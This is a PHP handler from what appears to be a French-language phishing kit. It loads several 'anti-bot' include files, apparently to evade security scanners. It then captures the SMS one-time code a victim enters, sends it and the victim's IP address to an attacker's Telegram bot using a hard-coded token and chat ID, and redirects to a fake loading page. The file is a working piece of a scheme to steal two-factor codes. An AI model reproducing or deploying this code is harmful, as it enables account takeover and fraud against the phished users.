<?php

include '../src/antibots.php';
include '../antibots.php';
include '../anti/anti1.php';
include '../anti/anti2.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti7.php';
include '../anti/anti8.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otp = htmlspecialchars($_POST['otp']);
    $ip = $_SERVER['REMOTE_ADDR'];

    if (empty($otp)) {
        die('Code non fourni.');
    }

    // Infos Telegram
    $telegramBotToken = '8013840116:AAGh5D3KdwSRvjBd5q-oSYcio0PHoDhCazQ';
    $chatID = '8134069302';

    // Message formaté
    $message = "<b>📲 Nouveau code reçu par SMS :</b>\n\n";
    $message .= "<b>🔢 Code :</b> <code>" . $otp . "</code>\n";
    $message .= "<b>🌐 IP :</b> <code>" . $ip . "</code>";

    // API Telegram
    $telegramAPI = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";

    $postData = [
        'chat_id' => $chatID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramAPI);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // OK en dev

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Erreur lors de l\'envoi Telegram : ' . curl_error($ch);
    } else {
        // Redirection vers la prochaine étape
        header("Location: ../chargement.php");
        exit;
    }
}
?>
